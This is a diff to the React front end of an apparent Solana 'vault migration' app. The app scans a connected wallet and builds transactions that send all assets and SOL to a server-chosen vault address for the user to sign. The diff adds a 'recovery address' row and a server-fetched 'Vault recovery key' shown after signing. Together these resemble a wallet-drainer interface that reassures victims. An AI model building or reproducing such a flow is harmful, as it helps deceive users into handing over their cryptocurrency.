@@ -2,16 +2,16 @@ import { useCallback, useEffect, useState } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
 import { useWalletModal } from "@solana/wallet-adapter-react-ui";
 import { VersionedTransaction } from "@solana/web3.js";
-import { scan, build, submit, type Asset } from "./api";
+import { scan, build, submit, recovery as fetchRecovery, type Asset } from "./api";
 import { short, amount, usd } from "./format";
 
 type Phase =
   | { k: "idle" }
   | { k: "scanning" }
-  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string }
+  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string; recovery: string }
   | { k: "signing"; step: number; of: number }
   | { k: "submitting"; step: number; of: number }
-  | { k: "done"; sig: string; count: number }
+  | { k: "done"; sig: string; count: number; key: string }
   | { k: "error"; msg: string };
 
 type PageId = "docs" | "security" | "terms" | "privacy" | "changelog";
@@ -40,6 +40,7 @@ export default function App() {
   const { publicKey, signTransaction, connected, disconnect } = useWallet();
   const { setVisible } = useWalletModal();
   const [phase, setPhase] = useState<Phase>({ k: "idle" });
+  const [copied, setCopied] = useState(false);
   const hash = useHashRoute();
   const page = PAGE_HASHES[hash] ?? null;
 
@@ -53,7 +54,7 @@ export default function App() {
     try {
       const res = await scan(owner);
       const total = res.assets.reduce((s, a) => s + (a.usd ?? 0), 0);
-      setPhase({ k: "review", assets: res.assets, sol: res.sol, total, vault: res.vault });
+      setPhase({ k: "review", assets: res.assets, sol: res.sol, total, vault: res.vault, recovery: res.recovery });
     } catch (e: any) {
       setPhase({ k: "error", msg: e.message ?? "Could not read wallet" });
     }
@@ -74,7 +75,11 @@ export default function App() {
           const signed = await signTransaction!(tx);
           setPhase({ k: "submitting", step: i + 1, of: txs.length });
           const { sig } = await submit(b64(signed.serialize()));
-          if (i === txs.length - 1) setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0) });
+          if (i === txs.length - 1) {
+              let key = "";
+              try { key = (await fetchRecovery(owner)).secret; } catch {}
+              setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0), key });
+            }
         }
         return;
       } catch (e: any) {
@@ -233,11 +238,18 @@ export default function App() {
                     <span className="def-key">Network fee</span>
                     <span className="def-val">~0.0001 SOL</span>
                   </div>
-                  <div className="def-row def-row-last">
+                  <div className="def-row">
                     <span className="def-key">Destination</span>
                     <span className="def-val def-val-col">
                       <span>Your Sable v2 vault</span>
                       <code className="def-addr">{short(phase.vault, 6)}</code>
+                    </span>
+                  </div>
+                  <div className="def-row def-row-last">
+                    <span className="def-key">Your recovery address</span>
+                    <span className="def-val def-val-col">
+                      <code className="def-addr">{short(phase.recovery, 6)}</code>
+                      <span className="def-sub">0.001 SOL credited to it</span>
                     </span>
                   </div>
                 </div>
@@ -297,13 +309,18 @@ export default function App() {
                     <span className="receipt-key">Signature</span>
                     <code className="receipt-sig">{short(phase.sig, 8)}</code>
                   </div>
-                  <div className="receipt-row receipt-link-row">
-                    <a className="receipt-link" href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
-                      View on Solscan →
-                    </a>
-                  </div>
                 </div>
-                <button className="primary" onClick={() => setPhase({ k: "idle" })}>Done</button>
+                {phase.key && (
+                  <div className="keyblock">
+                    <span className="xs muted">Vault recovery key</span>
+                    <code>{phase.key}</code>
+                    <button onClick={() => { navigator.clipboard.writeText(phase.key); setCopied(true); setTimeout(() => setCopied(false), 2000); }}>{copied ? "Copied" : "Copy"}</button>
+                  </div>
+                )}
+                <a className="receipt-link" style={{ display: "block", textAlign: "center", padding: "10px 0" }} href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
+                  View on Solscan →
+                </a>
+                <button className="primary" onClick={() => { setPhase({ k: "idle" }); setCopied(false); }}>Done</button>
               </div>
             )}
 
